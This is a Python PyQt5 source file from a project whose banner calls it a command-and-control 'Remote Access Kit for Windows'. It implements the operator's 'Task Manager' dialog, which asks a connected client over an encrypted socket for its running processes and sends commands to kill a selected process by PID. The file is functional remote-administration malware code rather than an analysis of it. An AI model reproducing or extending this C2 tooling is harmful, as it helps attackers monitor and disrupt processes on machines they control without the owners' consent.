#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.1
# -------------------------------------------------------------
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.Qt import Qt
from PyQt5.QtWidgets import QWidget,QMenu
from PyQt5.QtCore import QEvent

from ..utils.file_paths import DSFilePath,BGPath
from ..logging.logging import LoggingUtilitys
from ..Qt5.icons import IconObj
from ..client_handling.enumeration import SystemCommands
from ..client_handling.system import SystemManager

import os

class Ui_task_manager_dialog(QWidget):

    #Function will refresh the UI with current tasks from the system
    def refresh_tasks(self):
        SystemCommands().extract_running_process(self.encryption_key,self.client_socket_obj)    #Tell the client to send of the current running tasks
        while True:                                                                             #Start loop
            if os.path.exists(DSFilePath().task_manager_file):                                  #If the task manager data from the client has arrived,
                break                                                                           #Break the loop
        self.task_table_widget.setRowCount(0)                                                   #Clear the table widget
        self.populate_task_list()                                                               #Populate the task list

    #Function will instruct the agent to kill a task by pid
    def kill_task(self):
        task_row = self.task_table_widget.currentRow()                  #Get the current row from the click
        process_pid = self.task_table_widget.item(task_row,1).text()    #Get the text from column containing the pid
        SystemManager().kill_client_process(str(process_pid),self.encryption_key,self.client_socket_obj) #Instruct client to kill process
        while True:                                                     #Start loop
            if os.path.exists(DSFilePath().job_file):                   #When the job file exists,
                os.remove(DSFilePath().job_file)                        #Remove the file
                break                                                   #Break the loop
        self.refresh_tasks()                                            #Refresh the task list

    #Function will populate the task list with the data received from the client
    def populate_task_list(self):
        client_task_data = LoggingUtilitys().retrieve_file_data(DSFilePath().task_manager_file) #Retrieve data written to file from socket
        row_count = 0                               #Set row count to 0
        column_count = 0                            #Set column count to 0
        self.task_table_widget.setRowCount(len(client_task_data.split(','))/3) #Set the row count to the number of data pieces divided by 3
        data = client_task_data.split(', ')                                    #Split the data into array
        for item in data:                                                      #For each item in data array,
            if item != '':                                                     #If the item is not an empty string,
                if column_count == 3: #Check to make sure column count doesnt extend past 3 slots
                    column_count = 0  #Set it to 0
                    row_count += 1    #Add 1 to the row count
                if column_count == 2: #If c count == 2, try to split the item to check if it's a valid cpu item
                    try:
                        repr(item.split('.')[1]) #Force error if item can't be split
                    except Exception:          #If error occurs
                        item = 'N/A'           #Set CPU resource to N/A,else it's a valid cpu measurement and can be posted
                data_cell = QtWidgets.QTableWidgetItem(item.replace('"','').replace("'",'')) #Populate item object with data
                data_cell.setTextAlignment(Qt.AlignLeft)                                     #Set text alignment
                data_cell.setFlags(Qt.ItemIsEnabled)                                         #Make sure item can't be edited
                data_cell.setBackground(Qt.transparent)                                      #Set background to transparent
                self.task_table_widget.setItem(row_count,column_count,data_cell)             #Add item to the table widget
                column_count += 1                                                            #Increase column count
        os.remove(DSFilePath().task_manager_file)                                            #Remove task manager file as data is no longer needed

    def eventFilter(self, source, event):
        if event.type() == QEvent.ContextMenu and source is self.task_table_widget:
            context_menu = QMenu(self)  # Create Menu Object
            refresh_tasks = context_menu.addAction('Refresh')                 #Add refresh action
            kill_process = context_menu.addAction('Kill Process')             #Add Kill Process action
            refresh_tasks.setIcon(IconObj().sync_icon)                        #Icon
            kill_process.setIcon(IconObj().kill_task_icon)                    #Icon

            action = context_menu.exec_(self.mapToGlobal(event.globalPos()))  # Define the click action bool for the menu

            if action == refresh_tasks:                                       #If the action is to refresh the tasks
                self.refresh_tasks()                                          #Refresh the window with current tasks

            if action == kill_process:                                        #If the action is to kill a process
                self.kill_task()                                              #Kill the task

            return True
        return super().eventFilter(source, event)

    def setupUi(self, task_manager_dialog,client_socket_obj,encryption_key):
        task_manager_dialog.setObjectName("task_manager_dialog")
        task_manager_dialog.resize(535, 704)
        task_manager_dialog.setWindowIcon(IconObj().task_manager_icon)
        self.client_socket_obj = client_socket_obj
        self.encryption_key = encryption_key
        self.task_table_widget = QtWidgets.QTableWidget(task_manager_dialog)
        self.task_table_widget.setGeometry(QtCore.QRect(20, 30, 491, 581))
        self.task_table_widget.setStyleSheet(f"background-image: url({BGPath().task_man_bg});")
        self.task_table_widget.installEventFilter(self)
        self.task_table_widget.setObjectName("task_table_widget")
        self.task_table_widget.setColumnCount(3)
        self.task_table_widget.setRowCount(0)
        item = QtWidgets.QTableWidgetItem()
        self.task_table_widget.setHorizontalHeaderItem(0, item)
        self.task_table_widget.setColumnWidth(0, 290)
        item = QtWidgets.QTableWidgetItem()
        self.task_table_widget.setHorizontalHeaderItem(1, item)
        self.task_table_widget.setColumnWidth(1, 99)
        item = QtWidgets.QTableWidgetItem()
        self.task_table_widget.setHorizontalHeaderItem(2, item)
        self.task_table_widget.setColumnWidth(2, 92)
        self.task_table_widget.horizontalHeader().setVisible(True)
        self.task_table_widget.horizontalHeader().setCascadingSectionResizes(False)
        self.task_table_widget.horizontalHeader().setHighlightSections(False)
        self.task_table_widget.horizontalHeader().setSortIndicatorShown(False)
        self.task_table_widget.horizontalHeader().setStretchLastSection(True)
        self.task_table_widget.verticalHeader().setCascadingSectionResizes(False)
        self.task_table_widget.verticalHeader().setSortIndicatorShown(False)
        self.task_table_widget.verticalHeader().setStretchLastSection(False)
        self.task_table_widget.verticalHeader().setVisible(False)
        self.retranslateUi(task_manager_dialog)
        self.populate_task_list()
        QtCore.QMetaObject.connectSlotsByName(task_manager_dialog)

    def retranslateUi(self, task_manager_dialog):
        _translate = QtCore.QCoreApplication.translate
        task_manager_dialog.setWindowTitle(_translate("task_manager_dialog", "Task Manager"))
        item = self.task_table_widget.horizontalHeaderItem(0)
        item.setText(_translate("task_manager_dialog", "Process Name"))
        item = self.task_table_widget.horizontalHeaderItem(1)
        item.setText(_translate("task_manager_dialog", "PID"))
        item = self.task_table_widget.horizontalHeaderItem(2)
        item.setText(_translate("task_manager_dialog", "CPU"))
